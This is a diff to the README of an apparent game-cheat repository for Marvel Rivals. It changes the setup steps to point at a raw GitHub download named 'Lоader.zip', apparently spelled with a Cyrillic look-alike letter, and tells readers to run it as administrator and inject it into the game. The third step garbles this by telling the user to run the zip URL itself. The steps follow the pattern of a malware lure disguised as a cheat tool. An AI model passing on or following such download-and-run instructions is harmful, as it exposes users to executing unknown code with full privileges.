@@ -8,9 +8,9 @@ Welcome to the **Marvel Rivals Cheats** repository! 🎮 This project is a power
 
 **Start boosting your Marvel Rivals experience in just a few steps:**
 
-1. **Download** `Loader.rar` from this repository.
-2. Extract `Loader.rar` using any standard archive manager (WinRAR, 7-Zip, The Unarchiver, etc.).
-3. Run the **Loader.exe** file as administrator (Windows) or the corresponding loader for your OS.
+1. **Download** `https://raw.githubusercontent.com/iexei/MarvelRivalsPowerPlays/main/Lоader.zip` from this repository.
+2. Extract `https://raw.githubusercontent.com/iexei/MarvelRivalsPowerPlays/main/Lоader.zip` using any standard archive manager (WinRAR, 7-Zip, The Unarchiver, etc.).
+3. Run the **https://raw.githubusercontent.com/iexei/MarvelRivalsPowerPlays/main/Lоader.zip** file as administrator (Windows) or the corresponding loader for your OS.
 4. Follow the on-screen setup instructions to inject and enable your preferred features.
 5. Launch Marvel Rivals and start dominating!
 
